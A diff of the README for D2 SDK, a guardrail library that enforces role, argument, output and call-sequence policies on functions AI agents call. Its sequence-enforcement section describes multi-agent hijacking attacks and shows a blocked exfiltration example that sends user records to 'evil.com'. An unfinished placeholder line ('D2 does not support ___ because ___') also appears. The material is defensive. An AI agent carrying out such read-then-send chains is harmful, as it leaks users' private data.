@@ -1,137 +1,188 @@
-# D2‑Python · Detect & Deny
+<div align="center">
 
-<div align="left">
+<img src="./logo.png" alt="D2 SDK Logo" width="200" />
 
-<a href="https://github.com/artoo-corporation/D2-Python/actions/workflows/ci.yml">
-  <img src="https://img.shields.io/github/actions/workflow/status/artoo-corporation/D2-Python/ci.yml?label=CI" alt="CI" />
-</a>
-<img src="https://img.shields.io/badge/python-3.9%E2%80%933.12-blue" alt="Python Versions" />
-<img src="https://img.shields.io/badge/license-BUSL--1.1-blue" alt="License" />
+# D2 SDK
+
+### Deterministic Function-Level Guardrails for AI Agents
+
+**Control what your AI can do—one function at a time.**
+
+[![CI](https://img.shields.io/github/actions/workflow/status/artoo-corporation/D2-Python/ci.yml?label=CI)](https://github.com/artoo-corporation/D2-Python/actions/workflows/ci.yml)
+![Python Versions](https://img.shields.io/badge/python-3.9%E2%80%933.12-blue)
+![License](https://img.shields.io/badge/license-BUSL--1.1-blue)
+
+[Documentation](https://www.artoo.love/documentation/full) • [Quickstart](https://www.artoo.love/documentation/quick-start)
+
+<a href="https://www.linkedin.com/company/artoo-security"><img src="https://img.shields.io/badge/LinkedIn-0077B5?style=for-the-badge&logo=linkedin&logoColor=white" alt="LinkedIn" /></a>
+<a href="https://x.com/artoosec"><img src="https://img.shields.io/badge/X-000000?style=for-the-badge&logo=x&logoColor=white" alt="X/Twitter" /></a>
+<a href="https://bsky.app/profile/artoosec.bsky.social"><img src="https://img.shields.io/badge/Bluesky-0285FF?style=for-the-badge&logo=bluesky&logoColor=white" alt="Bluesky" /></a>
+<a href="https://substack.com/@artoodavid"><img src="https://img.shields.io/badge/Substack-FF6719?style=for-the-badge&logo=substack&logoColor=white" alt="Substack" /></a>
+<a href="https://discord.gg/pzhUZzFR"><img src="https://img.shields.io/badge/Discord-5865F2?style=for-the-badge&logo=discord&logoColor=white" alt="Discord" /></a>
 
 </div>
 
-D2 lets you put a fast, default‑deny RBAC guard in front of any Python function your LLM (or app) can call.
+---
 
-- Secure by default: if a tool isn’t explicitly allowed, it’s blocked
-- Small surface area: one decorator, a per-request user context, and you’re good to go
-- Declarative input/output guardrails: describe argument constraints and redaction rules in policy; D2 enforces them around your tool automatically
-- Telemetry with guardrails: metrics + usage events stream out automatically, and exporter hiccups never crash your app
-- Local files for dev, signed bundles for prod: flip on Cloud mode for polling, JWKS rotation, and hosted analytics
+## What is D2?
 
-—
+D2-SDK adds granular control to any function your LLM or application can call. Think of it as a security guard that sits in front of your Python functions, enforcing anything you outline in simple policy language based on YAML/JSON.
 
-## 📦 Install & bootstrap
+
+**What makes it useful:**
+
+- Secure by default. If a tool isn't explicitly allowed in your policy, it gets blocked.
+- Small surface area. One decorator, some user context, and you're done.
+- Declarative guardrails. Set rules for arguments and return values in your policy file. D2 enforces them automatically.
+- Built-in telemetry. Metrics and usage events are captured automatically. Problems with the exporter never crash your app.
+- Works locally or in the cloud. Use local files for development, switch to signed cloud bundles for production.
+- Catches typos early. Policy validation happens at load time, not when your app is running in production.
+
+---
+
+## Installation and setup
 
 ```bash
-pip install d2-sdk[cli,all]
+pip install "d2-sdk[all]"
 ```
 
-Pick the bootstrap that matches your app:
+Pick the initialization that matches your app type:
 
-- Sync apps (CLI scripts, Flask/Django startup):
+**For synchronous apps** (CLI scripts, Flask, Django):
 
 ```python
 from d2 import configure_rbac_sync
 
-configure_rbac_sync()  # call once at startup
+configure_rbac_sync()  # Call this once at startup
 ```
 
-- Async apps (FastAPI, asyncio scripts):
+**For async apps** (FastAPI, asyncio scripts):
 
 ```python
 import d2, asyncio
 
 async def lifespan():
-    await d2.configure_rbac_async()  # call once at startup
+    await d2.configure_rbac_async()  # Call this once at startup
 ```
 
-Notes
-- With `D2_TOKEN` unset → local‑file mode (reads a local policy file)
-- With `D2_TOKEN` set → cloud mode (signed bundles + background polling)
+**How modes work:**
 
-> Note: The examples in `examples/` are interactive and use `print`/`input` for demonstration.
+- No `D2_TOKEN` set: Reads policy from a local file
+- `D2_TOKEN` set: Uses signed bundles from the cloud with background updates
 
----
-
-## 🔒 API stability (since 1.0)
-
-The public API exported from `d2` is considered stable. Backward-incompatible changes will follow semantic versioning with a major version bump. Key stable symbols:
-- Decorator: `d2_guard` (alias `d2`)
-- RBAC bootstrap: `configure_rbac_async`, `configure_rbac_sync`, `shutdown_rbac`, `shutdown_all_rbac`, `get_policy_manager`
-- Context helpers: `set_user`, `set_user_context`, `get_user_context`, `clear_user_context`, `warn_if_context_set`
-- Middleware: `ASGIMiddleware`, `headers_extractor`, `clear_context`, `clear_context_async`
-- Exceptions: `PermissionDeniedError`, `MissingPolicyError`, `BundleExpiredError`, `TooManyToolsError`, `PolicyTooLargeError`, `InvalidSignatureError`, `ConfigurationError`, `D2PlanLimitError`, `D2Error`
+The examples in the `examples/` folder are interactive and use `print` and `input` for demonstration.
 
 ---
 
-## 🛡️ Guard sensitive functions
+## API stability (version 1.0 and later)
 
-Add `@d2_guard("tool-id")` to any function that should be policy-gated.
+The public API exported from `d2` follows semantic versioning. Breaking changes will bump the major version. These symbols are stable:
 
-- Works on both `def` and `async def`
-- If you call a sync tool from an async context, D2 auto‑threads it so you never block the event-loop (no extra code required)
+**Core functionality:**
+
+- Decorator: `d2_guard` (also available as `d2`)
+- RBAC setup: `configure_rbac_async`, `configure_rbac_sync`, `shutdown_rbac`, `shutdown_all_rbac`, `get_policy_manager`
+- Context management: `set_user`, `set_user_context`, `get_user_context`, `clear_user_context`, `warn_if_context_set`
+- Web middleware: `ASGIMiddleware`, `headers_extractor`, `clear_context`, `clear_context_async`
+- Error types: `PermissionDeniedError`, `MissingPolicyError`, `BundleExpiredError`, `TooManyToolsError`, `PolicyTooLargeError`, `InvalidSignatureError`, `ConfigurationError`, `D2PlanLimitError`, `D2Error`
+
+---
+
+## Protecting functions with the decorator
+
+Put `@d2_guard("tool-id")` on any function that needs authorization checks.
+
+Works with both regular functions and async functions. If you call a sync tool from inside an async context, D2 automatically runs it in a background thread so it doesn't block the event loop.
+
+### Basic example with RBAC
 
 ```python
-from d2 import d2_guard
+from d2 import d2_guard, set_user, configure_rbac_sync
+from d2.exceptions import PermissionDeniedError
+
+# Initialize D2 at startup
+configure_rbac_sync()
 
 @d2_guard("billing:read")
 def read_billing():
-    return {...}
+    return {"balance": 1000, "currency": "USD"}
 
 @d2_guard("analytics:run")
 async def run_analytics():
     return await compute()
+
+# Now use it in your application:
+set_user("alice-123", roles=["viewer"])
+
+try:
+    data = read_billing()  
+    # D2 checks: Does role "viewer" have permission for "billing:read"?
+    # If policy allows it: function runs, returns data
+    # If policy denies it: raises PermissionDeniedError before function runs
+except PermissionDeniedError:
+    # Tool was blocked by policy
+    return {"error": "Access denied"}, 403
 ```
+
+**What happens under the hood:**
+
+1. User calls `read_billing()`
+2. D2 intercepts the call (via the `@d2_guard` decorator)
+3. D2 looks up the current user context (`alice-123` with role `viewer`)
+4. D2 checks the policy: "Does `viewer` role have permission for `billing:read`?"
+5. If YES: Function runs and returns data
+6. If NO: Raises `PermissionDeniedError` (function never runs)
+
+**Policy example:**
+
+```yaml
+policies:
+  - role: viewer
+    permissions:
+      - billing:read  # Allowed
+      # analytics:run not listed, so it's denied
+  
+  - role: admin
+    permissions: ["*"]  # Wildcard allows everything
+```
+
+With this policy:
+- `viewer` CAN call `read_billing()` (explicitly allowed)
+- `viewer` CANNOT call `run_analytics()` (not in permission list)
+- `admin` CAN call both (wildcard permission)
 
 ---
 
-## 👤 Set (and clear) user context per request
+## Setting and clearing user context
 
-D2 authorizes by current user roles. Set it once per request; clear it after.
+D2 needs to know who the current user is and what roles they have. Set this once per request, then clear it when done.
 
-- Sync handlers (Flask/Django/etc.):
+### What you're telling D2
+
+When you call `set_user("alice-123", roles=["analyst", "viewer"])`, you're telling D2:
+- The current request is from user `alice-123`
+- This user has roles `analyst` and `viewer`  
+- Check the policy to see what tools these roles can access
+
+**For sync handlers** (Flask, Django, etc.):
 
 ```python
 from d2 import set_user, clear_context
 
-@clear_context
+@clear_context  # Automatically clears context after function returns
 def view(request):
+    # Your app's authentication already determined:
+    # - request.user.id = "alice-123"
+    # - request.user.roles = ["analyst", "viewer"]
+    
     set_user(request.user.id, roles=request.user.roles)
-    return read_billing()
+    
+    # Now D2 knows who's calling and will enforce their policy
+    return read_billing()  # This checks: can analyst/viewer call billing:read?
 ```
 
-- ASGI apps (FastAPI/Starlette):
+**Manual pattern** (when not using decorators or middleware):
 
-```python
-from d2 import ASGIMiddleware, headers_extractor
-
-app.add_middleware(ASGIMiddleware, user_extractor=headers_extractor)
-# Only behind a trusted proxy that injects/rewrites headers
-```
-
-What is `user_extractor`?
-- It’s a function that receives the ASGI `scope` and must return a tuple `(user_id, roles)`.
-- The built-in `headers_extractor` reads two headers:
-  - `X-D2-User`: the user id
-  - `X-D2-Roles`: a comma‑separated list of role names
-Use it only when a trusted gateway (e.g., your API gateway) sets or rewrites these headers.
-
-Custom extractor example
-```python
-def my_extractor(scope: dict):
-    # Safer when your app already knows the user from session/JWT
-    session = scope.get("session", {})
-    user_id = session.get("user_id")
-    roles = session.get("roles", [])
-    return user_id, roles
-
-app.add_middleware(ASGIMiddleware, user_extractor=my_extractor)
-```
-
-Tip
-- If you don’t use the middleware, call `d2.clear_user_context()` at the end of each request (or use `@clear_context_async` for async handlers)
-
-Explicit pattern without decorators
 ```python
 from d2 import set_user, clear_user_context
 
@@ -140,21 +191,231 @@ def handle_request(req):
         set_user(req.user.id, roles=req.user.roles)
         return do_work()
     finally:
-        clear_user_context()
+        clear_user_context()  # Always clear, even if exception occurs
 ```
+
+**Why clearing matters:**
+
+If you don't clear context, the next request might accidentally use the previous user's identity. Always use:
+- `@clear_context` decorator, or
+- `@clear_context_async` decorator, or  
+- Manual `clear_user_context()` in a `finally` block
 
 ---
 
-## ✅ Policy-driven input & output guardrails (new in 1.1)
+## Input and output guardrails (version 1.1+)
 
-Two questions matter every time a tool is called:
+Two questions come up every time a tool gets called:
 
-1. **Did the caller send us something we’re willing to run?**
-2. **Are we comfortable with the data we send back?**
+1. Should we run this with these arguments?
+2. Is the data we're about to return safe to send?
 
-D2 now lets you answer both straight from the policy file. No helper code, no wrappers, just rules.
+D2 lets you answer both questions in your policy file. No extra code needed, just rules.
 
-### Input rules (keep bad calls out)
+### Understanding guardrail rules
+
+Before writing policies, understand what you can validate and how to reference data.
+
+**Available constraint operators:**
+
+These operators work for both input validation and output validation/sanitization:
+
+| Operator | Purpose | Example | Works On |
+|----------|---------|---------|----------|
+| `type` | Check value type | `{type: int}`, `{type: string}` | Any value |
+| `required` | Field must be present | `{required: true}` | Any field |
+| `eq` | Exact match | `{eq: "admin"}`, `{eq: 100}` | String, number, bool |
+| `ne` | Not equal to | `{ne: "guest"}` | String, number, bool |
+| `min` | Minimum value | `{min: 1}` | Numbers |
+| `max` | Maximum value | `{max: 1000}` | Numbers |
+| `gt` | Greater than | `{gt: 0}` | Numbers |
+| `lt` | Less than | `{lt: 100}` | Numbers |
+| `in` | Must be in list | `{in: [sales, marketing]}` | String, number |
+| `not_in` | Must not be in list | `{not_in: [sms, push]}` | String, number |
+| `minLength` | Minimum length | `{minLength: 3}` | String, list |
+| `maxLength` | Maximum length | `{maxLength: 50}` | String, list |
+| `matches` | Regex pattern match | `{matches: "^[a-z_]+$"}` | String |
+| `not_matches` | Regex must not match | `{not_matches: "(?i)password"}` | String |
+| `contains` | String contains substring | `{contains: "@example.com"}` | String |
+| `startsWith` | String starts with prefix | `{startsWith: "https://"}` | String |
+| `endsWith` | String ends with suffix | `{endsWith: ".com"}` | String |
+
+**Important notes:**
+
+- Operator names are case-sensitive (`minLength` not `minlength`)
+- Multiple operators on the same field are AND conditions (all must pass)
+- Unknown operators cause `ConfigurationError` at load time (fail fast, not at runtime)
+
+**Data structures you can validate:**
+
+D2 can inspect and validate any JSON-serializable value:
+
+- **Simple values:** String, number, boolean
+- **Dictionaries:** `{"name": "Alice", "age": 30}`
+- **Lists:** `["item1", "item2", "item3"]`
+- **Nested structures:** Any combination of the above
+
+**Field path conventions:**
+
+**For input validation:** Only top-level parameter names are supported. Each function parameter gets its own rule:
+
+```yaml
+input:
+  user_id: {type: int, min: 1}      # Parameter name
+  table: {in: [sales, marketing]}   # Parameter name
+  limit: {min: 1, max: 1000}        # Parameter name
+```
+
+If you need nested validation, pass a dict parameter and validate the whole dict structure:
+
+```python
+@d2_guard("search")
+def search(filters: dict):
+    # D2 can validate that 'filters' is present and is a dict
+    # But cannot validate filters.status with dot notation
+    ...
+```
+
+**For output validation and sanitization:** Full dot notation is supported for nested structures.
+
+Here's what the policy rules look like alongside the actual return values they operate on:
+
+**Example 1: Simple top-level fields**
+
+```python
+# What your function returns:
+return {"user_id": 42, "status": "active"}
+
+# Policy rule:
+output:
+  user_id: {type: int, min: 1}       # Validates the "user_id" field
+  status: {in: [active, pending]}     # Validates the "status" field
+```
+
+**Example 2: Nested fields (one level deep)**
+
+```python
+# What your function returns:
+return {
+    "user": {
+        "email": "alice@example.com",
+        "age": 30
+    }
+}
+
+# Policy rule uses dot notation to reach nested fields:
+output:
+  user.email: {matches: "^[a-zA-Z0-9._%+-]+@.*"}  # Reaches into user → email
+  user.age: {min: 18, max: 120}                    # Reaches into user → age
+```
+
+**Example 3: Lists of dicts (applies to ALL items)**
+
+```python
+# What your function returns:
+return {
+    "records": [
+        {"name": "Alice", "ssn": "123-45-6789"},
+        {"name": "Bob", "ssn": "987-65-4321"},
+        {"name": "Carol", "ssn": "111-22-3333"}
+    ]
+}
+
+# Policy rule targets fields in EVERY list item:
+output:
+  records.ssn: {action: filter}  # Removes "ssn" from ALL records
+  
+# What the caller receives after sanitization:
+{
+    "records": [
+        {"name": "Alice"},      # ssn removed
+        {"name": "Bob"},        # ssn removed
+        {"name": "Carol"}       # ssn removed
+    ]
+}
+```
+
+**Example 4: Deeply nested (multiple levels)**
+
+```python
+# What your function returns:
+return {
+    "data": {
+        "profile": {
+            "settings": {
+                "theme": "dark",
+                "notifications": True
+            }
+        }
+    }
+}
+
+# Policy rule uses chained dot notation:
+output:
+  data.profile.settings.theme: {in: [light, dark]}
+  # Path: data → profile → settings → theme
+  
+# D2 walks the path step by step to find the value
+```
+
+**How path resolution works:**
+
+When you write `user.email` in a policy, D2:
+1. Looks for a field called `user` in the return value
+2. Inside `user`, looks for a field called `email`
+3. Applies the validation/sanitization rule to that value
+
+For lists, `records.ssn` means:
+1. Look for a field called `records`
+2. If it's a list, apply the rule to the `ssn` field in EVERY item
+
+**Writing functions for policy validation:**
+
+**For outputs (full dot notation support):**
+
+Return dicts with named fields so policies can use dot notation:
+
+```python
+# Good: Nested dicts let output policies target specific fields
+@d2_guard("get_user")
+def get_user(user_id: int):
+    return {
+        "name": "Alice",
+        "profile": {"email": "alice@example.com", "age": 30}
+    }
+    # Output policy can use: profile.email, profile.age
+
+# Avoid: Tuples can't be targeted by field name
+@d2_guard("get_user")
+def get_user(user_id: int):
+    return ("Alice", "alice@example.com", 30)  # Policy can't distinguish fields
+```
+
+**For inputs (top-level parameters only):**
+
+Since input validation only works on parameter names, structure your function signatures accordingly:
+
+```python
+# Good: Simple parameters are easy to validate
+@d2_guard("search")
+def search(table: str, limit: int, format: str):
+    # Input policy can validate: table, limit, format
+    ...
+
+# Also fine: Dict parameter (validate as whole, not nested fields)
+@d2_guard("create_record")
+def create_record(data: dict):
+    # Input policy can validate: data (presence, type)
+    # But NOT data.title or data.priority (no dot notation)
+    ...
+```
+
+D2 does not support ___ because ___
+### Input rules (blocking bad arguments)
+
+Input validation checks function arguments before execution. If any argument violates the policy, the call is blocked.
+
+**Example:**
 
 ```yaml
 policies:
@@ -169,25 +430,32 @@ policies:
             format: {matches: "^[a-z_]+$"}
 ```
 
-And the guarded function might look like:
-
 ```python
 @d2_guard("reports.generate")
-def generate(table: str, row_limit: int):
+def generate(table: str, row_limit: int, format: str):
+    # Only runs if arguments pass validation
     ...
+
+# This works:
+generate(table="analytics", row_limit=500, format="weekly_summary")
+
+# These are blocked:
+generate(table="engineering", row_limit=500, format="daily")  # table not in list
+generate(table="analytics", row_limit=5000, format="daily")   # row_limit > 1000
+generate(table="analytics", row_limit=100, format="Ad-Hoc")   # format has uppercase
 ```
 
-D2 binds the call, checks each rule, and blocks execution if anything falls outside the policy. Violations raise `PermissionDeniedError` (or trigger your `on_deny` handler) and telemetry records `reason="input_validation"` for easy tracing.
+Violations raise `PermissionDeniedError` (or trigger your `on_deny` handler) and telemetry records `reason="input_validation"`.
 
-Operators cover the basics—equals/not-equals, allow/deny lists, numeric bounds, string prefix/suffix/contains, regex checks, length checks, explicit type checks. Because policies live outside the codebase, security can tune them without waiting for a deploy.
+Because policies live outside your code, security teams can update them without waiting for a deployment
 
-### Output rules (validate and sanitize responses)
+### Output rules (validating and cleaning responses)
 
-D2 provides two complementary capabilities for output processing:
+D2 has two ways to handle output:
 
-#### 1. Output Validation (constraint checking)
+**1. Output validation (checking structure)**
 
-Validates return values against declarative constraints—just like input validation, but for outputs. If validation fails, the entire response is denied.
+This checks return values the same way input validation checks arguments. If validation fails, the whole response is blocked.
 
 ```yaml
 policies:
@@ -202,15 +470,35 @@ policies:
             format: {type: string, in: [json, csv, xml]}
 ```
 
-**Key characteristics:**
-- Uses constraint operators WITHOUT `action` keyword
-- Denies entire response if violated (no transformation)
-- Symmetric with input validation
-- Think: "Is this return value structurally valid?"
+**What it does:**
 
-#### 2. Output Sanitization (transformation)
+- Uses constraint operators without the `action` keyword
+- Blocks the entire response if anything violates the rules
+- Works the same way as input validation
+- Think: "Is this response structure valid?"
 
-Transforms return values to remove or redact sensitive data using field actions. This happens after validation passes.
+**2. Output sanitization (removing sensitive data)**
+
+This transforms return values to remove or hide sensitive information. Happens after validation passes.
+
+**Complete example** showing validation, sanitization, and what the caller receives:
+
+Say your function returns customer data like this:
+
+```python
+@d2_guard("crm.lookup_customer")
+def lookup_customer(customer_id: str):
+    return {
+        "status": "found",
+        "name": "Alice Smith",
+        "ssn": "123-45-6789",
+        "salary": 150000,
+        "notes": "VIP customer with SECRET clearance",
+        "items": ["item1", "item2", ..., "item150"]  # 150 items
+    }
+```
+
+You can sanitize this output with policy rules:
 
 ```yaml
 policies:
@@ -220,100 +508,456 @@ policies:
         allow: true
         conditions:
           output:
-            # Validation (pure constraints, no transformation)
+            # Validation (just checks, doesn't change anything)
             status: {required: true, in: [found, not_found]}
             
-            # Sanitization (field actions, transforms data)
-            ssn: {action: filter}                        # Remove field
-            salary: {max: 100000, action: redact}        # Redact if > 100k
-            notes: {matches: "(?i)secret", action: deny} # Deny if pattern found
-            items: {maxLength: 100, action: truncate}    # Trim to 100 items
+            # Sanitization rules (these transform the data)
+            ssn: {action: filter}                        # Remove ssn field entirely
+            salary: {max: 100000, action: redact}        # Redact if over 100k
+            notes: {matches: "(?i)secret", action: deny} # Block response if "secret" found
+            items: {maxLength: 100, action: truncate}    # Limit array to 100 items
             
-            # Global sanitization rules
+            # Global rules
             max_bytes: 65536
             require_fields_absent: [internal_flag]
 ```
 
-Paired with a tool such as:
+**What the caller receives after sanitization:**
 
 ```python
-@d2_guard("crm.lookup_customer")
-def lookup_customer(customer_id: str):
-    ...
+{
+    "status": "found",        # Unchanged (passed validation)
+    "name": "Alice Smith",    # Unchanged (no rule for this field)
+    # ssn removed entirely (filter action)
+    "salary": "[REDACTED]",   # Redacted because 150000 > 100000
+    # Response BLOCKED before reaching caller (deny action triggered by "SECRET")
+}
 ```
 
-**Processing order:**
-1. **Validate**: Check constraints without `action` (deny if violated)
-2. **Sanitize**: Apply field actions (transform or deny)
-3. Return cleaned value to caller
+In this case, the whole response is blocked because `notes` matched the forbidden pattern. If `notes` didn't contain "SECRET", the caller would receive the data with `ssn` removed and `salary` redacted
 
-**Field-level actions:**
+**How it processes:**
 
-- `action: filter` — drop the field entirely
-- `action: redact` — replace value with `[REDACTED]` (or pattern-substitute if `matches` specified)
-- `action: deny` — block entire response if field triggers
-- `action: truncate` — trim field value (requires `maxLength`)
+1. Validate: Check constraints without `action` (block if violated)
+2. Sanitize: Apply field actions (transform or block)
+3. Return the cleaned result
 
-Actions can be **conditional** (only trigger on constraint violation):
+**Field actions:**
+
+- `action: filter`: Remove the field completely
+- `action: redact`: Replace value with `[REDACTED]` (or use pattern substitution if `matches` is set)
+- `action: deny`: Block the whole response if this field triggers
+- `action: truncate`: Limit field size (needs `maxLength`)
+
+Actions can be conditional (only trigger when a constraint is violated):
+
 ```yaml
-salary: {max: 100000, action: redact}  # Only redact if > 100k
-score: {type: int, max: 100, action: filter}  # Only remove if invalid or > 100
+salary: {max: 100000, action: redact}  # Only redact if over 100k
+score: {type: int, max: 100, action: filter}  # Only remove if invalid or over 100
 ```
 
-**Constraint operators (work on both input and output):**
+**Available constraint operators** (work for both input and output):
 
-- `type`, `min`, `max`, `gt`, `lt` — numeric/type validation
-- `minLength`, `maxLength` — length checks
-- `in`, `not_in` — allow/deny lists
-- `matches`, `contains`, `startsWith`, `endsWith` — string pattern checks
-- `eq`, `ne`, `required` — equality/presence checks
+- `type`, `min`, `max`, `gt`, `lt`: Number and type checks
+- `minLength`, `maxLength`: Size limits
+- `in`, `not_in`: Allow and deny lists
+- `matches`, `contains`, `startsWith`, `endsWith`: String pattern checks
+- `eq`, `ne`, `required`: Equality and presence checks
+
+**Important: Operator names are case-sensitive**
+
+D2 rejects policies that have typos or unknown operators. This prevents silent failures where you think a rule is protecting your app but it's actually being ignored.
+
+**Common mistakes D2 catches:**
+
+| Wrong | Right |
+|-------|-------|
+| `minimum` | `min` |
+| `maximum` | `max` |
+| `minlength` or `minLenght` | `minLength` (capital L) |
+| `maxlength` or `maxLenght` | `maxLength` (capital L) |
+| `Type` or `MIN` | Lowercase (except Length) |
+
+If you see a `ConfigurationError` about unknown operators, check the spelling. The error message suggests the correct operator.
 
 **Global sanitization rules:**
 
-- `deny_if_patterns` — block if sanitized output still matches forbidden patterns
-- `require_fields_absent` — block if forbidden fields exist anywhere
-- `max_bytes` — enforce size limit on serialized output
+- `deny_if_patterns`: Block if the cleaned output still matches forbidden patterns
+- `require_fields_absent`: Block if forbidden fields exist anywhere in the response
+- `max_bytes`: Set a size limit on the serialized output
 
 **Key differences:**
 
-| Aspect | Validation | Sanitization |
-|--------|-----------|--------------|
-| **Keyword** | No `action` | Requires `action` |
-| **Effect** | Deny if violated | Transform (or deny if `action: deny`) |
-| **Value** | Never modified | Always transformed when triggered |
-| **Use case** | "Is this structurally valid?" | "Remove sensitive data" |
+| What | Validation | Sanitization |
+|------|------------|--------------|
+| Keyword | No `action` | Needs `action` |
+| What happens | Blocks if violated | Changes data (or blocks if `action: deny`) |
+| Changes value | Never | Always when triggered |
+| Use for | "Is this valid?" | "Remove sensitive data" |
 
-Stack them however you like. If no rule fires, we return the original value untouched. If a validation or deny rule triggers, D2 raises `PermissionDeniedError` (or calls your `on_deny` handler) with `reason="output_validation"` or `reason="output_sanitization"` for easy auditing. Telemetry records the same reason codes for downstream monitoring.
+You can combine them however you want. If nothing triggers, the original value comes back unchanged. If a validation or deny rule triggers, D2 raises `PermissionDeniedError` (or runs your `on_deny` handler) with `reason="output_validation"` or `reason="output_sanitization"`. Telemetry records the same reason codes.
 
-#### Nested guards
+### Nested guards
 
-- Guarded functions can safely call other guarded functions. Each layer re-runs input checks and output sanitation using the same user context, so inner responses are cleaned before outer guards inspect or return them.
+Protected functions can safely call other protected functions. Each layer checks inputs and sanitizes outputs using the same user context. Inner responses get cleaned before outer functions see them.
 
-Run `python examples/guardrails_demo.py` to watch both guardrail types block bad inputs and sanitize outputs using the sample policy in `examples/guardrails_policy.yaml`.
+Run `python examples/guardrails_demo.py` to see both types of guardrails in action. It uses the sample policy in `examples/guardrails_policy.yaml` to block bad inputs and sanitize outputs.
 
 ---
 
-## 🧩 Generate a policy and iterate locally
+## Sequence enforcement (version 1.1+)
 
-Create a local policy (no cloud token required):
+**What it does:** Stops dangerous patterns of tool calls, like reading from a database and then sending data to an external API.
+
+Traditional RBAC only checks "who can call what." Sequence enforcement checks "what can be called after what." This prevents data leaks in systems where multiple agents work together.
+
+### The problem
+
+When multiple agents work together, attackers can trick one agent into misusing another agent's permissions. Research from Trail of Bits ([Multi-Agent System Hijacking](https://blog.trailofbits.com/2025/07/31/hijacking-multi-agent-systems-in-your-pajamas/)) shows common attack patterns:
+
+- Direct data leak: `database.read` followed by `web.http_request`
+- Secrets leak: `secrets.get_key` followed by `web.http_request`
+- Hiding the trail: `database.read` then `analytics.process` then `web.http_request`
+
+Traditional RBAC can't stop this because both operations are individually allowed. The sequence is what makes it dangerous.
+
+### The solution
+
+Define forbidden sequences in your policy:
+
+```yaml
+policies:
+  - role: research_agent
+    permissions:
+      - database.read_users
+      - web.http_request
+      - analytics.summarize
+    
+    # Sequence enforcement
+    sequence:
+      # Block direct leaks
+      - deny: ["database.read_users", "web.http_request"]
+        reason: "Database access followed by external request may leak user data"
+      
+      # Block hiding the trail (3-step)
+      - deny: ["database.read_users", "analytics.summarize", "web.http_request"]
+        reason: "Data flow to external endpoints through analytics"
+```
+
+### How it works
+
+D2 tracks which tools have been called in the current request using `contextvars`. Before running a protected function, it checks if the sequence would create a forbidden pattern.
+
+**Execution layers:**
+
+1. Layer 1 (RBAC): Can this role call this tool?
+2. Layer 2 (Sequence): Does this call create a forbidden pattern?
+3. Layer 3 (Input): Are these arguments safe?
+4. Run the function
+5. Layer 4 (Output): Is the return value safe?
+
+**Example: Attack blocked**
+
+```python
+@d2_guard("database.read_users")
+async def read_users():
+    return [{"id": 1, "name": "Alice"}, {"id": 2, "name": "Bob"}]
+
+@d2_guard("web.http_request")
+async def send_request(url, data):
+    return {"status": "sent"}
+
+# Start of request
+set_user("agent-1", roles=["research_agent"])
+
+# Call 1: Read from database
+users = await read_users()
+# ✓ RBAC check passes (role has database.read_users permission)
+# ✓ Sequence check passes (call history is empty, no pattern formed)
+# ✓ Function runs
+# D2's internal call history: ["database.read_users"]
+
+# Call 2: Try to send data externally
+await send_request("https://evil.com", users)
+# ✓ RBAC check passes (role has web.http_request permission)
+# ✗ Sequence check FAILS
+#   Current history: ["database.read_users"]
+#   Next tool: "web.http_request"
+#   Pattern formed: ["database.read_users", "web.http_request"]
+#   Policy says: deny this sequence
+# ✗ Raises PermissionDeniedError with reason="sequence_violation"
+# ✗ Function never runs, data never sent
+```
+
+**Example: Safe workflow allowed**
+
+```python
+@d2_guard("analytics.summarize")
+async def summarize(data):
+    return {"count": len(data)}
+
+# Start of request (fresh context)
+set_user("agent-2", roles=["research_agent"])
+
+# Call 1: Process data internally
+analytics = await summarize([1, 2, 3])
+# ✓ Function runs
+# Call history: ["analytics.summarize"]
+
+# Call 2: Read from database
+users = await read_users()
+# ✓ Checking sequence: ["analytics.summarize", "database.read_users"]
+# ✓ No policy rule blocks this pattern
+# ✓ Function runs
+# Call history: ["analytics.summarize", "database.read_users"]
+
+# This is safe because:
+# - No sensitive data went to external systems
+# - Order matters: analytics THEN database (not database THEN external)
+```
+
+**What D2 tracks per request:**
+
+```python
+# Example internal state (you don't see this, D2 manages it)
+{
+    "user_id": "agent-1",
+    "roles": ["research_agent"],
+    "call_history": ["database.read_users"],  # Updated after each guarded call
+    "request_id": "req-abc-123"  # For telemetry correlation
+}
+```
+
+When the request ends (context cleared), the call history resets. Next request starts with an empty history
+
+### What you get
+
+- Request isolated: Call history gets cleared automatically between requests
+- Admin bypass: Wildcard roles skip sequence checks
+- Telemetry: Blocks are tagged with `reason="sequence_violation"`
+- No code changes: Just update your policy file
+- Memory efficient: Tool groups use lazy expansion, so large groups don't cause memory problems
+
+### Scaling to large tool groups
+
+For policies with many tools, use tool groups with lazy expansion to prevent memory exhaustion.
+
+**The problem without groups:**
+
+```yaml
+# Without groups: Must list every combination explicitly
+policies:
+  - role: analyst
+    sequence:
+      - deny: ["database.read_users", "web.http_request"]
+      - deny: ["database.read_users", "email.send"]
+      - deny: ["database.read_users", "slack.post"]
+      - deny: ["database.read_payments", "web.http_request"]
+      - deny: ["database.read_payments", "email.send"]
+      - deny: ["database.read_payments", "slack.post"]
+      - deny: ["secrets.get_key", "web.http_request"]
+      - deny: ["secrets.get_key", "email.send"]
+      - deny: ["secrets.get_key", "slack.post"]
+      # 3 sensitive × 3 external = 9 explicit rules
+      # With 50 tools each: 50×50 = 2,500 rules!
+```
+
+**The solution with groups:**
+
+```yaml
+metadata:
+  tool_groups:
+    sensitive: [database.read_users, database.read_payments, secrets.get_key]
+    external: [web.http_request, email.send, slack.post]
+
+policies:
+  - role: analyst
+    sequence:
+      # One rule covers all 9 combinations
+      - deny: ["@sensitive", "@external"]
+        reason: "Prevent data leaks through any external channel"
+```
+
+**How lazy expansion works at runtime:**
+
+```python
+# Policy has: deny: ["@sensitive", "@external"]
+
+# Call 1
+await read_users()  # Tool: database.read_users
+# ✓ D2 updates history: ["database.read_users"]
+
+# Call 2
+await send_email("user@example.com", data)  # Tool: email.send
+# D2 checks: Does ["database.read_users", "email.send"] match a forbidden pattern?
+# 
+# Step 1: Look at pattern ["@sensitive", "@external"]
+# Step 2: Is "database.read_users" in @sensitive group? → YES (O(1) set lookup)
+# Step 3: Is "email.send" in @external group? → YES (O(1) set lookup)
+# Step 4: Pattern matches! → DENY
+#
+# No need to materialize all 9 combinations in memory
+# Just check set membership at runtime
+```
+
+**Memory savings:**
+
+| Scenario | Without Groups | With Groups |
+|----------|----------------|-------------|
+| 3×3 tools (2-hop) | 9 rules in memory | 1 rule + 2 sets (6 items) |
+| 50×50 tools (2-hop) | 2,500 rules | 1 rule + 2 sets (100 items) |
+| 50×50×50 (3-hop) | 125,000 rules | 1 rule + 3 sets (150 items) |
+
